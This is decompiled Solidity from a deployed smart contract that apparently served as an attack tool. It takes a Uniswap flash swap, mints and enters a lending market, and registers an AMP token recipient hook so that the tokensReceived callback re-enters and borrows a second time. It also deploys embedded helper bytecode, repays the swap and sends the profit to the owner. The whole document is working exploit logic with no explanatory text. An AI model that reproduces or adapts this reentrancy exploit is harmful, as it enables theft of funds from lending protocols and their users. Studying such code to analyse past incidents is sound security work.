// Decompiled by library.dedaub.com
// 2022.12.01 08:03 UTC

// Data structures and variables inferred from the use of storage instructions
uint256 stor_9; // STORAGE[0x9]
uint256 stor_a; // STORAGE[0xa]
uint256 stor_b; // STORAGE[0xb]
uint256 stor_c; // STORAGE[0xc]
uint256 stor_0_0_19; // STORAGE[0x0] bytes 0 to 19
uint256 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19
uint256 stor_2_0_19; // STORAGE[0x2] bytes 0 to 19
uint256 _uniswapV2Call; // STORAGE[0x3] bytes 0 to 19
uint256 stor_4_0_19; // STORAGE[0x4] bytes 0 to 19
uint256 stor_5_0_19; // STORAGE[0x5] bytes 0 to 19
uint256 stor_6_0_19; // STORAGE[0x6] bytes 0 to 19
uint256 stor_7_0_19; // STORAGE[0x7] bytes 0 to 19
uint256 _changeOwner; // STORAGE[0xd] bytes 0 to 19


function () public payable {
}

function uniswapV2Call(address varg0, uint256 varg1, uint256 varg2, bytes varg3) public nonPayable {
    require(msg.data.length - 4 >= 128);
    require(varg0 == varg0);
    require(varg3 <= 0xffffffffffffffff);
    require(4 + varg3 + 31 < msg.data.length);
    require(varg3.length <= 0xffffffffffffffff);
    require(4 + varg3 + varg3.length + 32 <= msg.data.length);
    if (varg1 <= 0) {
    }
    require(_uniswapV2Call.code.size);
    v0, v1 = _uniswapV2Call.approve(stor_1_0_19, ~0).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v1 == v1);
    require(_uniswapV2Call.code.size);
    v2 = _uniswapV2Call.withdraw(v3).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(stor_2_0_19.code.size);
    v4 = stor_2_0_19.mint().value(this.balance).gas(msg.gas);
    require(v4); // checks call status, propagates error data on error
    v5 = new uint256[](1);
    if (1) {
        CALLDATACOPY(v5.data, msg.data.length, 32);
    }
    require(v5.length, Panic(50));
    v6 = v5.data;
    v5[0] = stor_2_0_19;
    MEM[MEM[64]] = 0xc299823800000000000000000000000000000000000000000000000000000000;
    v7 = new array[](v5.length);
    v8 = v9 = 0;
    v10 = v11 = v7.data;
    v12 = v13 = v5.data;
    while (v8 < v5.length) {
        MEM[v10] = address(MEM[v12]);
        v10 += 32;
        v12 += 32;
        v8 += 1;
    }
    require(stor_4_0_19.code.size);
    v14, v15 = stor_4_0_19.enterMarkets(v7).gas(msg.gas);
    require(v14); // checks call status, propagates error data on error
    RETURNDATACOPY(v15, 0, RETURNDATASIZE());
    MEM[64] = v15 + (~0x1f & RETURNDATASIZE() + 31);
    v16 = v17 = 0;
    require(v15 + RETURNDATASIZE() - v15 >= 32v17, v17);
    require(MEM[v15] <= 0xffffffffffffffffv17, v17);
    require(v15 + MEM[v15] + 31 < v15 + RETURNDATASIZE()v17, v17);
    require(MEM[v15 + MEM[v15]] <= 0xffffffffffffffff, Panic(65));
    require(!((MEM[64] + ((MEM[v15 + MEM[v15]] << 5) + 63 & ~0x1f) > 0xffffffffffffffff) | (MEM[64] + ((MEM[v15 + MEM[v15]] << 5) + 63 & ~0x1f) < MEM[64])), Panic(65));
    MEM[64] = MEM[64] + ((MEM[v15 + MEM[v15]] << 5) + 63 & ~0x1f);
    MEM[MEM[64]] = MEM[v15 + MEM[v15]];
    v18 = v19 = MEM[64] + 32;
    v20 = v21 = 32 + (v15 + MEM[v15]);
    require(v15 + RETURNDATASIZE() >= 32 + (v15 + MEM[v15] + (MEM[v15 + MEM[v15]] << 5))v17, v17);
    while (v16 < MEM[v15 + MEM[v15]]) {
        MEM[v18] = MEM[v20];
        v16 += 1;
        v18 += 32;
        v20 += 32;
    }
    require(stor_1_0_19.code.size);
    v22, v23 = stor_1_0_19.borrow(stor_b).gas(msg.gas);
    require(v22); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    MEM[(MEM[64]) len 1281] = 0x6080604052600080546001600160a01b031990811673d06527d5e56a3495252a528c4987003b712860ee17909155600180548216732db6c82ce72c8d7d770ba1b5f5ed0b6e075066d617905560028054821673ff20817765cb7f73d4bde2e66e067e58d11095c21790556003805490911673c02aaa39b223fe8d0a0e5c4f27ead9083c756cc217905534801561009457600080fd5b5061045d806100a46000396000f3fe60806040526004361061001e5760003560e01c8063794404d114610020575b005b34801561002c57600080fd5b5061001e61003b3660046103f7565b60025460015460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b390604401602060405180830381600087803b15801561008c57600080fd5b505af11580156100a0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100c491906103d0565b50600154600054604051637af1e23160e11b8152336004820152602481018490526001600160a01b03918216604482015291169063f5e3c46290606401602060405180830381600087803b15801561011b57600080fd5b505af115801561012f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610153919061040f565b506000546040516370a0823160e01b81523060048201526001600160a01b039091169063db006a759082906370a082319060240160206040518083038186803b15801561019f57600080fd5b505afa1580156101b3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101d7919061040f565b6040518263ffffffff1660e01b81526004016101f591815260200190565b602060405180830381600087803b15801561020f57600080fd5b505af1158015610223573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610247919061040f565b5047156102b857600360009054906101000a90046001600160a01b03166001600160a01b031663d0e30db0476040518263ffffffff1660e01b81526004016000604051808303818588803b15801561029e57600080fd5b505af11580156102b2573d6000803e3d6000fd5b50505050505b6003546040516370a0823160e01b815230600482015261033e916001600160a01b031690339082906370a082319060240160206040518083038186803b15801561030157600080fd5b505afa158015610315573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610339919061040f565b610341565b33ff5b60405163a9059cbb60e01b81526001600160a01b03838116600483015260248201839052849160009183169063a9059cbb90604401602060405180830381600087803b15801561039057600080fd5b505af11580156103a4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103c891906103d0565b505050505050565b6000602082840312156103e1578081fd5b815180151581146103f0578182fd5b9392505050565b600060208284031215610408578081fd5b5035919050565b600060208284031215610420578081fd5b505191905056fea2646970667358221220cdd1942bdb77709242c97b4c2b6f3963c44dd02ad32cddbaca01f97f9f4579a564736f6c63430008040033;
    v24 = create.code(MEM[64], 1281).value(0);
    require(v24); // checks call status, propagates error data on error
    require(2, Panic(18));
    0xa8d(stor_b >> 1, v24, stor_6_0_19);
    require((address(v24)).code.size);
    v25 = address(v24).call(0x794404d1, stor_b >> 1).gas(msg.gas);
    require(v25); // checks call status, propagates error data on error
    if (0 != this.balance) {
        require(_uniswapV2Call.code.size);
        v26 = _uniswapV2Call.deposit().value(this.balance).gas(msg.gas);
        require(v26); // checks call status, propagates error data on error
    }
    v27 = 0xb1c(_uniswapV2Call);
    v28 = 0xb9c(v3);
    if (v28 > v27) {
        require(stor_6_0_19.code.size);
        v29, v30 = stor_6_0_19.approve(stor_5_0_19, ~0).gas(msg.gas);
        require(v29); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v30 == v30);
        v31 = new uint256[](2);
        CALLDATACOPY(v31.data, msg.data.length, 64);
        require(v31.length, Panic(50));
        v32 = v31.data;
        v31[0] = stor_6_0_19;
        require(1 < v31.length, Panic(50));
        v31[32] = _uniswapV2Call;
        v33 = 0xb1c(_uniswapV2Call);
        v34 = 0xb9c(v3);
        require(v34 >= v33, Panic(17));
        v35 = new array[](v31.length);
        v36 = v37 = 0;
        v38 = v39 = v35.data;
        v40 = v41 = v31.data;
        while (v36 < v31.length) {
            MEM[v38] = address(MEM[v40]);
            v38 += 32;
            v40 += 32;
            v36 += 1;
        }
        require(stor_5_0_19.code.size);
        v42, v43 = stor_5_0_19.swapTokensForExactTokens(v34 - v33, ~0, v35, address(this), block.timestamp).gas(msg.gas);
        require(v42); // checks call status, propagates error data on error
        RETURNDATACOPY(v43, 0, RETURNDATASIZE());
        MEM[64] = v43 + (~0x1f & RETURNDATASIZE() + 31);
        v44 = v45 = 0;
        require(v43 + RETURNDATASIZE() - v43 >= 32v45, v45);
        require(MEM[v43] <= 0xffffffffffffffffv45, v45);
        require(v43 + MEM[v43] + 31 < v43 + RETURNDATASIZE()v45, v45);
        require(MEM[v43 + MEM[v43]] <= 0xffffffffffffffff, Panic(65));
        require(!((MEM[64] + ((MEM[v43 + MEM[v43]] << 5) + 63 & ~0x1f) > 0xffffffffffffffff) | (MEM[64] + ((MEM[v43 + MEM[v43]] << 5) + 63 & ~0x1f) < MEM[64])), Panic(65));
        MEM[64] = MEM[64] + ((MEM[v43 + MEM[v43]] << 5) + 63 & ~0x1f);
        MEM[MEM[64]] = MEM[v43 + MEM[v43]];
        v46 = v47 = MEM[64] + 32;
        v48 = v49 = 32 + (v43 + MEM[v43]);
        require(v43 + RETURNDATASIZE() >= 32 + (v43 + MEM[v43] + (MEM[v43 + MEM[v43]] << 5))v45, v45);
        while (v44 < MEM[v43 + MEM[v43]]) {
            MEM[v46] = MEM[v48];
            v44 += 1;
            v46 += 32;
            v48 += 32;
        }
    }
    v50 = 0xb9c(v3);
    0xa8d(v50, stor_0_0_19, _uniswapV2Call);
}

function start(uint256 varg0, uint256 varg1, uint256 varg2) public nonPayable {
    require(msg.data.length - 4 >= 96);
    require(msg.sender == _changeOwner, Error(0x7775740000000000000000000000000000000000000000000000000000000000));
    if (!stor_a) {
        v0 = v1 = 0;
        while (v0 < v2.length) {
            MEM[v0 + (32 + MEM[64])] = v2[v0];
            v0 += 32;
        }
        if (v0 > v2.length) {
            MEM[32 + MEM[64] + v2.length] = 0;
        }
        require(stor_7_0_19.code.size);
        v3 = stor_7_0_19.setInterfaceImplementer(this, keccak256('AmpTokensRecipient'), this).gas(msg.gas);
        require(v3); // checks call status, propagates error data on error
        stor_a = 1;
    }
    stor_b = varg1;
    stor_c = varg2;
    v4 = new uint256[](1);
    MEM[MEM[64]] = 0x22c0d9f00000000000000000000000000000000000000000000000000000000;
    v5 = new array[](v4.length);
    v6 = v7 = 0;
    while (v6 < v4.length) {
        v5[v6] = v4[v6];
        v6 += 32;
    }
    if (v6 > v4.length) {
        v5[v4.length] = 0;
    }
    require(stor_0_0_19.code.size);
    v8 = stor_0_0_19.swap(0, varg0, address(this), v5).gas(msg.gas);
    require(v8); // checks call status, propagates error data on error
    v9 = 0xb1c(stor_6_0_19);
    0xa8d(v9, _changeOwner, stor_6_0_19);
    v10 = 0xb1c(_uniswapV2Call);
    0xa8d(v10, _changeOwner, _uniswapV2Call);
}

function tokensReceived(bytes4 varg0, bytes32 varg1, address varg2, address varg3, address varg4, uint256 varg5, bytes varg6, bytes varg7) public nonPayable {
    require(msg.data.length - 4 >= 256);
    require(varg0 == varg0 & ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
    require(varg2 == varg2);
    require(varg3 == varg3);
    require(varg4 == varg4);
    require(varg6 <= 0xffffffffffffffff);
    require(4 + varg6 + 31 < msg.data.length);
    require(varg6.length <= 0xffffffffffffffff);
    require(4 + varg6 + varg6.length + 32 <= msg.data.length);
    require(varg7 <= 0xffffffffffffffff);
    require(4 + varg7 + 31 < msg.data.length);
    require(varg7.length <= 0xffffffffffffffff);
    require(4 + varg7 + varg7.length + 32 <= msg.data.length);
    0x8fc(varg7.length, 4 + varg7 + 32, varg6.length, 4 + varg6 + 32, varg5, varg4, varg3, varg2, varg1, varg0);
}

function 0x8fc(uint256 varg0, uint256 varg1, uint256 varg2, uint256 varg3, uint256 varg4, uint256 varg5, uint256 varg6, uint256 varg7, uint256 varg8, uint256 varg9) private {
    require(stor_2_0_19.code.size);
    v0, v1 = stor_2_0_19.borrow(stor_c).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    return ;
}

function 0xa8d(uint256 varg0, uint256 varg1, uint256 varg2) private {
    v0 = address(varg1);
    v1 = address(varg2);
    require(v1.code.size);
    v2, v3 = v1.transfer(v0, varg0).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v3 == v3);
    return ;
}

function 0x98cdf374(uint256 varg0) public nonPayable {
    require(msg.data.length - 4 >= 32);
    require(varg0 == address(varg0));
    require(msg.sender == _changeOwner, Error(0x7775740000000000000000000000000000000000000000000000000000000000));
    require((address(varg0)).code.size);
    v0, v1 = address(varg0).balanceOf(this).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require((address(varg0)).code.size);
    v2, v3 = address(varg0).transfer(_changeOwner, v1).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v3 == v3);
}

function 0xb1c(uint256 varg0) private {
    v0 = address(varg0);
    require(v0.code.size);
    v1, v2 = v0.balanceOf(this).gas(msg.gas);
    require(v1); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    return v2;
}

function 0xb9c(uint256 varg0) private {
    require(!(varg0 & (stor_9 > ~0 / varg0)), Panic(17));
    require(10000, Panic(18));
    require(varg0 * stor_9 / 10000 <= ~varg0, Panic(17));
    return varg0 * stor_9 / 10000 + varg0;
}

function changeOwner(address varg0) public nonPayable {
    require(msg.data.length - 4 >= 32);
    require(varg0 == varg0);
    require(msg.sender == _changeOwner, Error(0x7775740000000000000000000000000000000000000000000000000000000000));
    _changeOwner = varg0;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable {
    MEM[64] = 128;
    if (msg.data.length < 4) {
        ();
    } else if (0x10d1e85c == function_selector >> 224) {
        uniswapV2Call(address,uint256,uint256,bytes);
    } else if (0x641ccd83 == function_selector >> 224) {
        start(uint256,uint256,uint256);
    } else if (0x8240ef48 == function_selector >> 224) {
        tokensReceived(bytes4,bytes32,address,address,address,uint256,bytes,bytes);
    } else if (0x98cdf374 == function_selector >> 224) {
        0x98cdf374();
    } else if (0xa6f9dae1 == function_selector >> 224) {
        changeOwner(address);
    } else {
        exit;
    }
}
